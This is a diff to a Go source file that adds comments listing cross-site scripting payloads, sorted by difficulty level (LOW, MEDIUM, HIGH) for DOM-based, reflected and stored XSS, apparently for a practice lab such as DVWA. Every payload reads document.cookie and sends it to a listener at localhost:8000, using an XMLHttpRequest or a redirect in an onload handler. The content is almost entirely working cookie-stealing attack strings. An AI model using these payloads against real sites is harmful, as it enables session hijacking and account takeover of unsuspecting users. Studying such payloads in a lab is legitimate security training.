@@ -5,6 +5,12 @@ import (
 	"net/http"
 )
 
+// DOM-based XSS
+// LOW: <script>var req = new XMLHttpRequest(); req.open("GET", "http://localhost:8000/xss?cookie=" + document.cookie, false); req.send();</script>
+// MEDIUM: <body onload='window.location.replace("http://localhost:8000/xss?cookie=" + document.cookie)'>
+// HIGH: #<script>var req = new XMLHttpRequest(); req.open("GET", "http://localhost:8000/xss?cookie=" + document.cookie, false); req.send();</script>
+
+// Reflected & Storage XSS
 // LOW: <script>var req = new XMLHttpRequest(); req.open("GET", "http://localhost:8000/xss?cookie=" + document.cookie, false); req.send();</script>
 // MEDIUM: <SCRIPT>var req = new XMLHttpRequest(); req.open("GET", "http://localhost:8000/xss?cookie=" + document.cookie, false); req.send();</SCRIPT>
 // HIGH: <body onload='window.location.replace("http://localhost:8000/xss?cookie=" + document.cookie)'>
